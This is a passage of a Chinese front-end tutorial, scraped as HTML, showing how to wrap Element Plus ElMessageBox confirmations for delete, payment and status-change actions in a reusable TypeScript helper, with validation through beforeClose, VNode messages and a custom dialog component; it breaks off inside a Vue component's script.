#4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">业务背景</h2>
<blockquote>
<p>我们做后台管理系统的时候，通常会有很多重复的页面逻辑，重复的控制流程需要做，最常见的例子应该便是确认删除。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a52011b19e047c3bef660b4437a07e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaW5DQmxl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764518510&amp;x-signature=V%2BNGGDuV9YSwzCLdnah4vmwkS7g%3D" alt="eIMScreenShot20251106150026855.jpg" loading="lazy"/></p>
<h3 data-id="heading-1">基本使用</h3>
<p>以 <code>element-plus</code> 举例，大家通常都是直接使用：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleDelete</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">id: <span class="hljs-built_in">number</span></span>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">await</span> <span class="hljs-title class_">ElMessageBox</span>.<span class="hljs-title function_">confirm</span>(<span class="hljs-string">"确定要删除这条数据吗?"</span>, <span class="hljs-string">"提示"</span>, {
      <span class="hljs-attr">confirmButtonText</span>: <span class="hljs-string">"确定"</span>,
      <span class="hljs-attr">cancelButtonText</span>: <span class="hljs-string">"取消"</span>,
      <span class="hljs-attr">type</span>: <span class="hljs-string">"warning"</span>,
    });

    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"请求参数："</span>, id);
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">api</span>();
    <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">"删除成功"</span>);
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-keyword">if</span> (error === <span class="hljs-string">"cancel"</span>) <span class="hljs-keyword">return</span>;
  }
};

</code></pre>
<h3 data-id="heading-2">重复冗余代码</h3>
<p>这种方式乍一看没啥问题，但在实际业务开发中，并不是只有一个删除的业务流程。也许还会存在 <strong>支付</strong>、<strong>发布</strong>、<strong>修改状态</strong> 等等流程确认操作。此时我们的代码也许就会演变成</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleDelete</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">await</span> <span class="hljs-title class_">ElMessageBox</span>.<span class="hljs-title function_">confirm</span>(<span class="hljs-string">"确定要删除这条数据吗？"</span>, <span class="hljs-string">"提示"</span>, {
      <span class="hljs-attr">confirmButtonText</span>: <span class="hljs-string">"确定"</span>,
      <span class="hljs-attr">cancelButtonText</span>: <span class="hljs-string">"取消"</span>,
      <span class="hljs-attr">type</span>: <span class="hljs-string">"warning"</span>,
    });
    
    <span class="hljs-comment">// 删除中...</span>
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-keyword">if</span> (error === <span class="hljs-string">"cancel"</span>) <span class="hljs-keyword">return</span>;
  }
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handlePayment</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">await</span> <span class="hljs-title class_">ElMessageBox</span>.<span class="hljs-title function_">confirm</span>(<span class="hljs-string">"是否确认支付当前订单？"</span>, <span class="hljs-string">"提示"</span>, {
      <span class="hljs-attr">confirmButtonText</span>: <span class="hljs-string">"确定"</span>,
      <span class="hljs-attr">cancelButtonText</span>: <span class="hljs-string">"取消"</span>,
      <span class="hljs-attr">type</span>: <span class="hljs-string">"warning"</span>,
    });
    
    <span class="hljs-comment">// 支付中...</span>
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-keyword">if</span> (error === <span class="hljs-string">"cancel"</span>) <span class="hljs-keyword">return</span>;
  }
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleUpdateStatus</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">await</span> <span class="hljs-title class_">ElMessageBox</span>.<span class="hljs-title function_">confirm</span>(<span class="hljs-string">"是否确认修改当前数据状态？"</span>, <span class="hljs-string">"提示"</span>, {
      <span class="hljs-attr">confirmButtonText</span>: <span class="hljs-string">"确定"</span>,
      <span class="hljs-attr">cancelButtonText</span>: <span class="hljs-string">"取消"</span>,
      <span class="hljs-attr">type</span>: <span class="hljs-string">"warning"</span>,
    });
    
    <span class="hljs-comment">// 修改状态...</span>
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-keyword">if</span> (error === <span class="hljs-string">"cancel"</span>) <span class="hljs-keyword">return</span>;
  }
};

</code></pre>
<h3 data-id="heading-3">createConfirmFlow 函数封装</h3>
<p>写到这里大家就会发现，整个项目中会有大量类似这种结构的重复代码，聪明的小伙伴已经开始对这段代码进行提取封装优化了。于是会得到：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">ElMessageBox</span>, <span class="hljs-keyword">type</span> <span class="hljs-title class_">ElMessageBoxOptions</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"element-plus"</span>;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">CallBack</span> = <span class="hljs-function">(<span class="hljs-params">...args: <span class="hljs-built_in">any</span>[]</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; | <span class="hljs-built_in">void</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">createConfirmFlow</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">
  callback: CallBack,
  options?: ElMessageBoxOptions
</span>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">async</span> (...<span class="hljs-attr">args</span>: <span class="hljs-title class_">Parameters</span>&lt;<span class="hljs-title class_">CallBack</span>&gt;) =&gt; {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> <span class="hljs-title class_">ElMessageBox</span>.<span class="hljs-title function_">confirm</span>(options.<span class="hljs-property">message</span>, options);
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">callback</span>(...args);
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-keyword">if</span> (error === <span class="hljs-string">"cancel"</span>) <span class="hljs-keyword">return</span>;
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error);
    }
  };
};

</code></pre>
<blockquote>
<p>此时使用 <strong>createConfirmFlow</strong> 来创建流程处理函数就会变得无比简洁</p>
</blockquote>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 创建删除流程</span>
<span class="hljs-keyword">const</span> handleDelete = <span class="hljs-title function_">createConfirmFlow</span>(
  <span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-comment">// 执行修改状态的逻辑...</span>
  },
  { <span class="hljs-attr">message</span>: <span class="hljs-string">"确定要删除这条数据吗？"</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">"提示"</span> }
);

<span class="hljs-comment">// 创建支付流程</span>
<span class="hljs-keyword">const</span> handlePayment = <span class="hljs-title function_">createConfirmFlow</span>(
  <span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-comment">// 执行修改状态的逻辑...</span>
  },
  { <span class="hljs-attr">message</span>: <span class="hljs-string">"是否确认支付当前订单？"</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">"提示"</span> }
);

<span class="hljs-comment">// 创建更新状态流程</span>
<span class="hljs-keyword">const</span> handleUpdateStatus = <span class="hljs-title function_">createConfirmFlow</span>(
  <span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-comment">// 执行修改状态的逻辑...</span>
  },
  { <span class="hljs-attr">message</span>: <span class="hljs-string">"是否确认修改当前数据状态？"</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">"提示"</span> }
);

</code></pre>
<h3 data-id="heading-4">业务场景思考</h3>
<p>基本使用基本上是没有什么大问题。但是在业务开发中，我习惯对业务需求做一个大致的流程梳理，以便优化自己的代码。以下是我自己的一些想法。</p>
<h4 data-id="heading-5">支付前置验证</h4>
<p>我想大多数人第一反应应该就是在流程处理函数中支付接口请求前验证一次即可，我们来试一下。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">validate</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
};

<span class="hljs-keyword">const</span> handlePayment = <span class="hljs-title function_">createConfirmFlow</span>(
  <span class="hljs-keyword">async</span> (row) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"发起支付"</span>, row);

    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">validate</span>()) {
      <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"验证失败，无法支付"</span>);
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"验证失败"</span>);
    }

    <span class="hljs-keyword">await</span> <span class="hljs-title function_">api</span>();
    <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">"支付成功"</span>);
  },
  {
    <span class="hljs-attr">title</span>: <span class="hljs-string">"支付提示"</span>,
    <span class="hljs-attr">message</span>: <span class="hljs-string">`总价为 ￥188 是否确认支付？`</span>,
  }
);

</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/807dc74267434dffb1584857af5834fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaW5DQmxl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764518510&amp;x-signature=PsjFmGYuDOyl%2BN7ygei2AbfbkjQ%3D" alt="动画.gif" loading="lazy"/></p>
<blockquote>
<p>我们会发现虽然验证函数确实成功拦截了后续接口请求的操作，但是确认框却关闭了。我认为这样的交互流程是比较意外的，既然是失败的话我期望的是这个确认窗口能保持显示。等待用户手动关闭即可。
当然了，这个属于小问题，大多数情况下应该是会忽略不管，每个人的看法不一。我这里只当是抛砖引玉，大家可以根据实际情况考虑。</p>
</blockquote>
<h5 data-id="heading-6">解决方案</h5>
<p>解决方案也很简单，ElMessage 为我们提供了 <strong>beforeClose</strong> 函数来处理关闭前的情况，只需要将验证函数提取到 <strong>beforeClos</strong> 中即可。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">validate</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
};

<span class="hljs-keyword">const</span> handlePayment = <span class="hljs-title function_">createConfirmFlow</span>(
  <span class="hljs-keyword">async</span> (row) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"发起支付"</span>, row);
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">api</span>();
    <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">"支付成功"</span>);
  },
  {
    <span class="hljs-attr">title</span>: <span class="hljs-string">"支付提示"</span>,
    <span class="hljs-attr">message</span>: <span class="hljs-string">`总价为 ￥188 是否确认支付？`</span>,
    <span class="hljs-attr">beforeClose</span>: <span class="hljs-keyword">async</span> (action, instance, done) =&gt; {
      <span class="hljs-keyword">if</span> (action === <span class="hljs-string">"confirm"</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"先干点别的"</span>);
        instance.<span class="hljs-property">confirmButtonLoading</span> = <span class="hljs-literal">true</span>;
        instance.<span class="hljs-property">confirmButtonText</span> = <span class="hljs-string">"支付中..."</span>;
        <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">3000</span>);

        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">validate</span>()) {
          <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"验证失败，无法支付"</span>);
          instance.<span class="hljs-property">confirmButtonLoading</span> = <span class="hljs-literal">false</span>;
          instance.<span class="hljs-property">confirmButtonText</span> = <span class="hljs-string">"OK"</span>;
          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"验证失败"</span>);
        }
      }

      <span class="hljs-title function_">done</span>();
    },
  }
);
</code></pre>
<blockquote>
<p>这样就达到我想要的效果了</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0c8f2f3d01e40089c38c638285f82d8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaW5DQmxl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764518510&amp;x-signature=QTDZbcrE1B1Crbc%2FjIYNCwO9sbQ%3D" alt="动画.gif" loading="lazy"/></p>
<h4 data-id="heading-7">动态的 message</h4>
<p>还是支付为例，获取订单中的商品数量跟价格，计算后赋值给 <strong>message</strong> 后再创建流程处理函数打开弹窗。</p>
<pre><code class="hljs language-typescript" lang="typescript">
<span class="hljs-comment">// row =&gt; { id: 2, name: "李四", quantity: 10, unitPrice: 88.0, ...... }</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handlePayment</span> = (<span class="hljs-params">row: User</span>) =&gt; {
  <span class="hljs-keyword">const</span> execute = <span class="hljs-title function_">createConfirmFlow</span>(
    <span class="hljs-keyword">async</span> () =&gt; {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"发起支付"</span>, row.<span class="hljs-property">quantity</span> * row.<span class="hljs-property">unitPrice</span>);
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">api</span>();
      <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">"支付成功"</span>);
    },
    {
      <span class="hljs-attr">title</span>: <span class="hljs-string">"支付提示"</span>,
      <span class="hljs-attr">message</span>: <span class="hljs-string">`总价为 ￥<span class="hljs-subst">${row.quantity * row.unitPrice}</span> 是否确认支付？`</span>,
      <span class="hljs-attr">beforeClose</span>: <span class="hljs-keyword">async</span> (action, instance, done) =&gt; {
        <span class="hljs-keyword">if</span> (action === <span class="hljs-string">"confirm"</span>) {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"先干点别的"</span>);
          instance.<span class="hljs-property">confirmButtonLoading</span> = <span class="hljs-literal">true</span>;
          instance.<span class="hljs-property">confirmButtonText</span> = <span class="hljs-string">"支付中..."</span>;
          <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">3000</span>);

          <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &lt; <span class="hljs-number">0.5</span>) {
            <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"验证失败，无法支付"</span>);
            instance.<span class="hljs-property">confirmButtonLoading</span> = <span class="hljs-literal">false</span>;
            instance.<span class="hljs-property">confirmButtonText</span> = <span class="hljs-string">"OK"</span>;
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"验证失败"</span>);
          }
        }

        <span class="hljs-title function_">done</span>();
      },
    }
  );

  <span class="hljs-title function_">execute</span>();
};

</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ab4f1b9fa514e0d88be463fbbab515f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaW5DQmxl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764518510&amp;x-signature=ZulrNgDBG1YOmiNBbs8MiiDQVcg%3D" alt="动画.gif" loading="lazy"/></p>
<h4 data-id="heading-8">自定义 message</h4>
<p>自定义 <strong>message</strong> 实际上跟 <strong>ElMessageBox</strong> 一样，给 <strong>message</strong> 参数传入一个 <strong>VNode</strong> 即可。还是以上面支付的例子扩展一下。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { h } <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span>

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handlePayment</span> = (<span class="hljs-params">row: User</span>) =&gt; {
 <span class="hljs-comment">// + 使用 h 创建一个 VNode</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title class_">MessageVNode</span> = <span class="hljs-title function_">h</span>(<span class="hljs-string">"p"</span>, [
    <span class="hljs-string">"总价为"</span>,
    <span class="hljs-title function_">h</span>(
      <span class="hljs-string">"strong"</span>,
      { <span class="hljs-attr">style</span>: <span class="hljs-string">"color: red;"</span> },
      <span class="hljs-string">` ￥<span class="hljs-subst">${row.quantity * row.unitPrice}</span> `</span>
    ),
    <span class="hljs-string">"是否确认支付？"</span>,
  ]);

  <span class="hljs-keyword">const</span> execute = <span class="hljs-title function_">createConfirmFlow</span>(
    <span class="hljs-keyword">async</span> () =&gt; {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"发起支付"</span>, row.<span class="hljs-property">quantity</span> * row.<span class="hljs-property">unitPrice</span>);
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">api</span>();
      <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(<span class="hljs-string">"支付成功"</span>);
    },
    {
      <span class="hljs-attr">title</span>: <span class="hljs-string">"支付提示"</span>,
      <span class="hljs-attr">message</span>: <span class="hljs-title class_">MessageVNode</span>, <span class="hljs-comment">// 将创建的 VNode 传给 message</span>
      <span class="hljs-attr">beforeClose</span>: <span class="hljs-keyword">async</span> (action, instance, done) =&gt; {
        <span class="hljs-keyword">if</span> (action === <span class="hljs-string">"confirm"</span>) {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"先干点别的"</span>);
          instance.<span class="hljs-property">confirmButtonLoading</span> = <span class="hljs-literal">true</span>;
          instance.<span class="hljs-property">confirmButtonText</span> = <span class="hljs-string">"支付中..."</span>;
          <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">3000</span>);

          <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &lt; <span class="hljs-number">0.5</span>) {
            <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"验证失败，无法支付"</span>);
            instance.<span class="hljs-property">confirmButtonLoading</span> = <span class="hljs-literal">false</span>;
            instance.<span class="hljs-property">confirmButtonText</span> = <span class="hljs-string">"OK"</span>;
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"验证失败"</span>);
          }
        }

        <span class="hljs-title function_">done</span>();
      },
    }
  );

  <span class="hljs-title function_">execute</span>();
};

</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cbabd133fc1549c380589a922d91c502~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaW5DQmxl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764518510&amp;x-signature=wH9pE3kfOxr9hxPveTddUFKJUWU%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-9">自定义确认组件</h4>
<p>在实际开发中，可能确认流程内部封装的组件不一定适用所有业务需要，也许在同样的流程中，会有不同的 <strong>UI</strong> 展示效果，也许需要使用自定义的确认组件。所以为了我们封装的这个流程复用工具函数能够支持自定义的 <strong>UI</strong> 组件，我需要对他做以下扩展。</p>
<blockquote>
<p>需要能扩展自定义组件的功能之前，需要抽象一些公共部分，并且约束自定义组件必须具备的特性，交给我们封装好的函数使用。</p>
</blockquote>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. 声明自定义组件必须具备的特性</span>
<span class="hljs-comment">// Message 参考 ElMessagebox 的类型</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">Message</span> = <span class="hljs-built_in">string</span> | <span class="hljs-title class_">VNode</span> | (<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">VNode</span>);
<span class="hljs-keyword">type</span> <span class="hljs-title class_">CallBack</span> = <span class="hljs-function">(<span class="hljs-params">...args: <span class="hljs-built_in">any</span>[]</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; | <span class="hljs-built_in">void</span>;

<span class="hljs-comment">// 声明配置类型，继承 ElMessageBoxOptions 的类型作为基本配置，并扩展我们自己的必须的类型</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ConfirmFlowOptions</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ElMessageBoxOptions</span> {
  message?: <span class="hljs-title class_">Message</span>;
  title?: <span class="hljs-built_in">string</span>;
  <span class="hljs-title class_">CustomComponent</span>?: <span class="hljs-title class_">CustomConfirmMessage</span> | <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;;
  [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">any</span>;
}

<span class="hljs-comment">// 这个是自定义组件的类型标注，必须要实现 confirm 函数</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">CustomConfirmMessage</span> {
  <span class="hljs-attr">confirm</span>: <span class="hljs-function">(<span class="hljs-params">
    message: ElMessageBoxOptions[<span class="hljs-string">"message"</span>],
    options?: ConfirmFlowOptions
  </span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">any</span>&gt;;
}

<span class="hljs-comment">// 辅助校验自定义组件是否存在 confirm 函数</span>
<span class="hljs-keyword">const</span> isConfirmMessage = (<span class="hljs-attr">obj</span>: <span class="hljs-built_in">unknown</span>): obj is <span class="hljs-title class_">CustomConfirmMessage</span> =&gt;
  <span class="hljs-title function_">isObject</span>(obj) &amp;&amp; !<span class="hljs-title function_">isNull</span>(obj) &amp;&amp; <span class="hljs-string">"confirm"</span> <span class="hljs-keyword">in</span> obj &amp;&amp; <span class="hljs-title function_">isFunction</span>(obj.<span class="hljs-property">confirm</span>);

<span class="hljs-comment">// 获取自定义组件构造器，核心目的也是为了调用 confirm </span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">getMessageConstructor</span> = (<span class="hljs-params">options: ConfirmFlowOptions = {}</span>) =&gt; {
  <span class="hljs-keyword">const</span> { <span class="hljs-title class_">CustomComponent</span> } = options;

  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isConfirmMessage</span>(<span class="hljs-title class_">CustomComponent</span>)) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">CustomComponent</span>;
  }

  <span class="hljs-keyword">return</span> <span class="hljs-title class_">ElMessageBox</span>;
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">createConfirmFlow</span> = (<span class="hljs-params">
  callback: CallBack,
  options?: ConfirmFlowOptions
</span>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">async</span> (...<span class="hljs-attr">args</span>: <span class="hljs-title class_">Parameters</span>&lt;<span class="hljs-title class_">CallBack</span>&gt;) =&gt; {
    <span class="hljs-comment">// + 获取流程确认组件</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title class_">ConfirmMessage</span> = <span class="hljs-title function_">getMessageConstructor</span>(options);

    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> <span class="hljs-title class_">ConfirmMessage</span>.<span class="hljs-title function_">confirm</span>(options?.<span class="hljs-property">message</span>, options);
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">callback</span>(...args);
      <span class="hljs-comment">// 修改状态...</span>
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-keyword">if</span> (error === <span class="hljs-string">"cancel"</span>) <span class="hljs-keyword">return</span>;
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error);
    }
  };
};

</code></pre>
<blockquote>
<p>上述代码描述了自定义组件必须具备的函数，并且统一了添加了 <strong>getMessageConstructor</strong> 函数来获取消息组件。可以是自定义的，也可以是默认的 <strong>ElMessageBox</strong></p>
</blockquote>
<ul>
<li>下面我写一个基本的自定义弹窗确认组件来演示这个自定义 <strong>ui</strong> 组件的功能是否正常</li>
</ul>
<ol>
<li>先创建一个 <strong>CustomConfirmDialog.vue</strong>组件</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript">&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">el-dialog</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"visible"</span> <span class="hljs-attr">:title</span>=<span class="hljs-string">"title"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"40%"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{{ message }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">footer</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"cancel"</span>&gt;</span>取消<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"primary"</span> <span class="hljs-attr">:loading</span>=<span class="hljs-string">"loading"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"confirm"</span>&gt;</span>
        {{ confirmText || "确定" }}
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">el-dialog</span>&gt;</span></span>
&lt;/template&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { getCurrentInstance, ref } <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span>;
